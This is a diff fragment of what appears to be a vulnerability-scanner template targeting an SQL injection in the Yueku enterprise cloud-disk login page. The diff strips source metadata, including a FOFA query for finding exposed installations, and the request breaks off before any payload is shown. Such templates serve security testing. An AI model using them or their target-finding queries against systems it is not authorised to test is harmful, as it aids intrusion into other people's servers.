@@ -3,14 +3,8 @@ info:
   name: 悦库企业网盘 userlogin.html SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xuuuh355dmykpqg8
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xuuuh355dmykpqg8
-    fofa: app="悦库-悦库网盘"
 http:
 - raw:
   - 'POST /user/login/.html HTTP/1.1
